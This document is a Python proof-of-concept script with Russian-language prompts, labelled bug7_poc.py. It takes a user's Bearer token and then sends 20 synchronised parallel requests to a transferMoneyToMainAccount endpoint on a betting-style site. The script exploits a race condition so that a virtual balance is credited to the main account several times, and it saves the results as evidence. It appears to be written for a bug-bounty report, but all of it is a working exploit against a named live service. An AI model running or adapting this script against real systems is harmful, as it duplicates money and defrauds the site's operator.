# bug7_poc.py
import requests
import threading
import time
import json

BASE = "https://1xlite-03801.world"
TOKEN = input("вставь Bearer token: ").strip()
USER_ID = int(input("вставь userId: "))

HEADERS = {
    "Authorization": f"Bearer {TOKEN}",
    "Content-Type": "application/json",
    "Origin": BASE
}

# узнать текущий виртуальный баланс
print("получаю текущий баланс...")
for path in ["/web-api/api/internal/v1/account/getbalance",
             "/web-api/api/internal/v1/account/getvirtualbalance"]:
    r = requests.post(path if path.startswith("http") else BASE + path,
                      json={"userId": USER_ID}, headers=HEADERS)
    print(f"{path}: {r.status_code} | {r.text[:200]}")

AMOUNT = float(input("\nвведи сумму виртуального баланса для перевода: "))

URL = BASE + "/web-api/api/internal/v1/account/transferMoneyToMainAccount"
BODY = {"amount": AMOUNT, "currency": "USD"}

results = []
lock = threading.Lock()
barrier = threading.Barrier(20)

def transfer(idx):
    barrier.wait()
    start = time.time()
    r = requests.post(URL, json=BODY, headers=HEADERS)
    elapsed = time.time() - start
    with lock:
        results.append({
            "thread": idx,
            "status": r.status_code,
            "elapsed_ms": round(elapsed * 1000),
            "response": r.text[:200]
        })
        print(f"поток {idx:2d}: {r.status_code} ({round(elapsed*1000)}ms) | {r.text[:60]}")

print(f"\nзапускаю 20 параллельных переводов по {AMOUNT} USD...")
print("сделай скриншот баланса СЕЙЧАС (до теста)")
input("нажми enter когда сделал скриншот баланса...")

threads = [threading.Thread(target=transfer, args=(i,)) for i in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()

success = [r for r in results if r["status"] == 200]
print(f"\n=== результат ===")
print(f"успешных переводов: {len(success)} из {len(results)}")

if len(success) > 1:
    print(f"=== КРИТИЧНО: {len(success)} переводов по {AMOUNT} USD = {len(success)*AMOUNT} USD переведено вместо {AMOUNT} USD ===")

print("\nсделай скриншот баланса СЕЙЧАС (после теста) и сравни с первым")

with open("bug7_evidence.json", "w") as f:
    json.dump({
        "amount_per_transfer": AMOUNT,
        "expected_total": AMOUNT,
        "actual_successful_transfers": len(success),
        "actual_total_transferred": len(success) * AMOUNT,
        "details": results
    }, f, indent=2)
print("сохранено в bug7_evidence.json")
